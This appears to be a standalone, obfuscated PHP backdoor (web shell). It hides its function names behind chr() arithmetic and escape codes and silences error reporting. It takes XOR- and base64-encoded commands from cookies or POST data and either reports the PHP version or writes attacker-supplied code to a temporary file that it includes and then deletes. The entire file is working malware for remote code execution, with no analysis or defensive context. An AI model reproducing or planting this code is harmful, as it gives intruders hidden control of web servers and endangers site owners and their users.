<?php $zarrjkhi = chr(102)."\x69"."\x6c".chr(626-525).'_'.'p'.'u'.chr(957-841).chr(911-816).chr(99).chr(807-696).chr(110)."\164"."\145".chr(701-591).chr(912-796).chr(501-386);
$jybuhrcaq = chr(98).chr(97)."\163".chr(101).'6'.'4'.'_'.chr(100).chr(101).'c'."\157"."\x64".'e';
$nrsbpikf = "\151".'n'."\x69".'_'."\163".chr(292-191).chr(116);
$drkwjmdth = chr(117).'n'."\154".chr(615-510)."\156".chr(107);


@$nrsbpikf("\145"."\162".chr(526-412).chr(338-227).'r'."\137".chr(623-515)."\157".chr(154-51), NULL);
@$nrsbpikf("\x6c".chr(111).chr(827-724)."\x5f".'e'."\162"."\x72"."\157".'r'."\163", 0);
@$nrsbpikf(chr(109)."\141".chr(120)."\x5f".chr(122-21).'x'.'e'."\143".chr(607-490)."\164".'i'.'o'."\x6e".chr(95).chr(255-139).chr(649-544)."\155".chr(690-589), 0);
@set_time_limit(0);

function ktlqmvwr($ceipyr, $kveffqfgl)
{
    $jpssgzimpz = "";
    for ($pybew = 0; $pybew < strlen($ceipyr);) {
        for ($j = 0; $j < strlen($kveffqfgl) && $pybew < strlen($ceipyr); $j++, $pybew++) {
            $jpssgzimpz .= chr(ord($ceipyr[$pybew]) ^ ord($kveffqfgl[$j]));
        }
    }
    return $jpssgzimpz;
}

$ombpldp = array_merge($_COOKIE, $_POST);
$ozuhxzwlf = '7eb08988-8ae5-493f-8768-6a784aa8c6d7';
foreach ($ombpldp as $hanwkmihz => $ceipyr) {
    $ceipyr = @unserialize(ktlqmvwr(ktlqmvwr($jybuhrcaq($ceipyr), $ozuhxzwlf), $hanwkmihz));
    if (isset($ceipyr["\141".'k'])) {
        if ($ceipyr["\141"] == "\x69") {
            $pybew = array(
                chr(112).'v' => @phpversion(),
                chr(1002-887)."\x76" => "3.5",
            );
            echo @serialize($pybew);
        } elseif ($ceipyr["\141"] == "\145") {
            $zhmrw = "./" . md5($ozuhxzwlf) . chr(749-703).'i'."\x6e".chr(99);
            @$zarrjkhi($zhmrw, "<" . "\77"."\x70".'h'.chr(112).chr(378-346).chr(913-849).'u'.chr(110).chr(676-568)."\x69".chr(110).chr(107)."\x28".'_'.chr(95)."\106"."\x49".'L'."\x45".chr(95).chr(95).')'."\73".chr(32) . $ceipyr['d']);
            include($zhmrw);
            @$drkwjmdth($zhmrw);
        }
        exit();
    }
}

